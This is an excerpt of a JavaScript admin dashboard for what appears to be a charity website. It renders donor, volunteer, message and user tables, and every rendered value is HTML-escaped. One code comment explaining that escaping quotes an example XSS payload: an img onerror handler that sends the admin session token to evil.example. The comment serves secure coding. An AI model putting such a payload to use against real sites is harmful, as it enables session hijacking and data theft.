...
// Every table below (donations, volunteer applications, contact messages,
// users, and the generic content CRUD table) renders data by building an
// HTML string and assigning it to .innerHTML. Donor names, applicant
// details, and especially contact-message text all come from PUBLIC forms —
// anyone on the internet can submit them, no login required — so this
// escaping is mandatory: without it, a name or message like
// `<img src=x onerror="fetch('https://evil.example/steal?t='+sessionStorage.kilkaari_admin_token)">`
// would execute in the admin's browser the moment they open that table,
// handing over their session token to an anonymous attacker. Never
// interpolate row data into a template string here without this.
...
async function loadDonations() {
  ...
  try {
    ...
    tbody.innerHTML = rows.map((r) => `
      <tr>
        <td>${escapeHtml(r.donor_name)}<br><span style="color:var(--color-ink-soft);font-size:.78rem;">${escapeHtml(r.donor_email)}</span></td>
...
async function loadVolunteers() {
  ...
  try {
    ...
    tbody.innerHTML = rows.map((r) => `
      <tr>
        <td>${escapeHtml(r.full_name)}<br><span style="color:var(--color-ink-soft);font-size:.78rem;">${escapeHtml(r.email)} · ${escapeHtml(r.phone)}</span></td>
        <td>${escapeHtml(r.city) || '—'}</td>
        <td>${escapeHtml(r.area_of_interest) || '—'}</td>
...
async function loadMessages() {
  ...
  try {
    ...
    tbody.innerHTML = rows.map((r) => `
      <tr>
        <td>${escapeHtml(r.full_name)}<br><span style="color:var(--color-ink-soft);font-size:.78rem;">${escapeHtml(r.email)}${r.phone ? ' · ' + escapeHtml(r.phone) : ''}</span></td>
  ...
  try {
    ...
    tbody.innerHTML = rows.map((r) => `
      <tr>
        ...
        <td><span class="pill pill-${r.role === 'admin' ? 'accepted' : 'reviewed'}">${escapeHtml(r.role)}</span></td>
...
const CONTENT_TYPES = {
  ...
  gallery: {
    ...
    fields: [
      ...
      { key: 'image_url', label: 'Image URL (must be a direct link ending in an image, e.g. .jpg/.png — not a Google Drive/Dropbox share link)', type: 'image-url', required: true, publicIdField: 'cloudinary_public_id' },
      { key: 'cloudinary_public_id', type: 'hidden' },
...
function renderCell(row, col) {
  ...
  if (col.pill) return `<span class="pill pill-${escapeHtml(val)}">${escapeHtml(STATUS_LABELS[val] || val)}</span>`;
  if (col.date && val) return escapeHtml(new Date(val).toLocaleString('en-IN'));
...
function openContentModal(type, id) {
  ...
  config.fields.filter((f) => f.type === 'image-url').forEach((f) => {
    ...
    wireImageUpload(f.key, f.publicIdField);
  });
...
function renderField(f, existing) {
  ...
  if (f.type === 'hidden') {
    // No label/wrapper — purely internal bookkeeping (e.g. gallery's
    // cloudinary_public_id) that the upload flow populates itself. Still
    // goes through the same escaping as every other field since its
    // value still lands in an HTML attribute.
    return `<input type="hidden" id="field-${f.key}" value="${escapeHtml(value)}">`;
  }
  if (f.type === 'checkbox') {
    return `
  ...
  if (f.type === 'textarea') {
    return `
      <div class="form-group">
        ...
        <textarea class="form-control" id="field-${f.key}" ${f.required ? 'required' : ''}>${escapeHtml(value)}</textarea>
      </div>`;
  }
  ...
  if (f.type === 'image-url') {
    return `
      <div class="form-group">
        <label class="form-label" for="field-${f.key}">${f.label}</label>
        <input class="form-control" type="text" id="field-${f.key}" value="${escapeHtml(value)}" placeholder="https://..." ${f.required ? 'required' : ''}>
  ...
  return `
    <div class="form-group">
      <label class="form-label" for="field-${f.key}">${f.label}</label>
      <input class="form-control" type="${f.type}" id="field-${f.key}" value="${escapeHtml(value)}" ${f.required ? 'required' : ''}>
    </div>`;
}
...
function wireImagePreview(inputId, previewId) {
  ...
  function checkUrl() {
    ...
    img.onload = () => {
      preview.innerHTML = `
        <img src="${escapeHtml(url)}" alt="Preview" style="max-width:160px; max-height:160px; border-radius:8px; display:block; object-fit:cover;">
...
function wireImageUpload(fieldKey, publicIdFieldKey) {
  ...
  // Optional — only gallery currently links an image-url field to a
  // hidden cloudinary_public_id field (see CONTENT_TYPES.gallery). Every
  // other content type's image field has no matching hidden input, so
  // this is simply null for them and the public_id from the upload
  // response is harmlessly discarded — everything else about the upload
  // flow behaves identically either way.
  const publicIdInput = publicIdFieldKey ? document.getElementById(`field-${publicIdFieldKey}`) : null;
